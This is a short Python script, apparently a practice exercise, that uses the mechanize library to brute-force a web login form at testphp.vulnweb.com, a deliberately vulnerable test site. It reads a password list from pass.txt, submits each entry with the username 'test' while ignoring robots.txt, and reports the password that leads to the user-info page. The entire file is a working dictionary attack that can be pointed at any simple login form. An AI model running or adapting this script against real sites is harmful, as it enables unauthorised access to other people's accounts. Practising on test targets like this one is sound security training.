import mechanize 
import itertools


br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)

br.open("http://testphp.vulnweb.com/login.php")


passwords = []
with open("pass.txt", 'r+') as f:
    passwords = f.readlines()

for x in passwords:	
	br.select_form( nr = 0 )
	br.form['uname'] = "test"
	br.form['pass'] = x.strip()
	print("Checking ",br.form['pass'])
	response=br.submit()
	if response.geturl()=="http://testphp.vulnweb.com/userinfo.php":
		print("Correct password is ",''.join(x))
		break